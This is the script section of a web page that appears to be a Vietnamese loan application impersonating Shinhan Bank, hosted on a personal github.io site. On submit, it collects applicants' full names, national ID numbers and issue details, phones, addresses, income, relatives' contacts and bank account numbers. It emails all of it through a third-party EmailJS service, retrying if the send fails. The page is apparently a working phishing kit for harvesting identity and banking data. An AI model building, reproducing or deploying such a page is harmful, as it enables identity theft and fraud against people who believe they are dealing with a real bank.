        disbursementDate: $('#disbursementDate').val() || getCurrentDate(),
        interestRate: parseFloat($('#interestRate').val()) || 7.0,
        monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')) || '',
        occupation: $('#occupation').val() || '',
        loanPurpose: $('#loanPurpose').val() || '',
        relativePhone: $('#relativePhone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
        relationship: $('#relationship').val() || '',
        accountName: $('#accountName').val().trim() || '',
        accountNumber: $('#accountNumber').val().trim().replace(/\s/g, '') || '',
        bankName: $('#bankName').val() || '',
        monthlyPayment: userData.monthlyPayment || '',
        totalInterest: userData.totalInterest || '',
        totalRepay: userData.totalRepay || '',
        currentStep: 1,
        isRegistered: userData.isRegistered || false,
        emailSent: userData.emailSent || false
    };
    saveToLocalStorage();
}

const debounceSave = debounce(saveFormDataRealTime, 300);

async function handleSubmit(event) {
    event.preventDefault();
    console.log('Form submission triggered');
    if (!validateForm()) {
        console.log('Validation failed, stopping submission');
        return;
    }

    const spinner = $('.spinner-submit');
    spinner.show();

    const loanAmountValue = $('#loanAmount').val();
    const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
    userData = {
        fullName: $('#fullName').val().trim() || '',
        dob: $('#dob').val() || '',
        gender: $('#gender').val() || '',
        contactAddress: $('#contactAddress').val().trim() || '',
        hometown: $('#hometown').val().trim() || '',
        nationality: $('#nationality').val().trim() || 'Việt Nam',
        cccd: $('#cccd').val().trim() || '',
        idIssueDate: $('#idIssueDate').val() || '',
        issuePlace: $('#issuePlace').val() || '',
        phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
        email: $('#email').val().trim() || '',
        loanType: $('#loanType').val() || '',
        loanTerm: $('#loanTerm').val() || '',
        loanAmount: loanAmount || '',
        disbursementDate: $('#disbursementDate').val() || getCurrentDate(),
        interestRate: parseFloat($('#interestRate').val()) || 7.0,
        monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')) || '',
        occupation: $('#occupation').val() || '',
        loanPurpose: $('#loanPurpose').val() || '',
        relativePhone: $('#relativePhone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
        relationship: $('#relationship').val() || '',
        accountName: $('#accountName').val().trim() || '',
        accountNumber: $('#accountNumber').val().trim().replace(/\s/g, '') || '',
        bankName: $('#bankName').val() || '',
        loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
        monthlyPayment: userData.monthlyPayment || '',
        totalInterest: userData.totalInterest || '',
        totalRepay: userData.totalRepay || '',
        currentStep: 2,
        isRegistered: true,
        emailSent: false
    };

    if (!saveToLocalStorage()) {
        console.error('LocalStorage save failed');
        spinner.hide();
        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
        return;
    }

    registeredUsers.push(userData.cccd);
    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
    localStorage.setItem('isRegistered', 'true');

    try {
        if (!emailjs) throw new Error('EmailJS not initialized');
        const response = await emailjs.send('service_60tgxof', 'template_op886wg', {
            full_name: userData.fullName,
            dob: userData.dob,
            gender: userData.gender,
            contact_address: userData.contactAddress,
            hometown: userData.hometown,
            id_number: userData.cccd,
            id_issue_date: userData.idIssueDate,
            nationality: userData.nationality,
            id_issue_place: userData.issuePlace,
            phone_number: userData.phone,
            email: userData.email,
            loan_type: userData.loanType,
            loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
            loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
            disbursement_date: userData.disbursementDate,
            income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
            occupation: userData.occupation,
            loan_purpose: userData.loanPurpose,
            relative_phone: userData.relativePhone,
            relationship: userData.relationship,
            account_holder_name: userData.accountName,
            account_number: userData.accountNumber,
            bank_name: userData.bankName,
            loan_code: userData.loanCode,
            monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VNĐ' : '',
            total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VNĐ' : '',
            total_repayment: userData.totalRepay ? userData.totalRepay.toLocaleString('vi-VN') + ' VNĐ' : ''
        });
        console.log('Email sent:', response.status, response.text);
        userData.emailSent = true;
        saveToLocalStorage();
    } catch (error) {
        console.error('Email error:', error);
        let retry = 2;
        while (retry > 0) {
            try {
                const response = await emailjs.send('service_60tgxof', 'template_op886wg', { ...userData });
                console.log('Email sent on retry:', response.status, response.text);
                userData.emailSent = true;
                saveToLocalStorage();
                break;
            } catch (retryError) {
                console.error(`Retry ${3 - retry} failed:`, retryError);
                retry--;
            }
        }
    }
    spinner.hide();
    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
}

$('#registrationForm input, #registrationForm select').on('change', debounceSave);
window.onload = loadUserData;
</script>
</body>
</html>
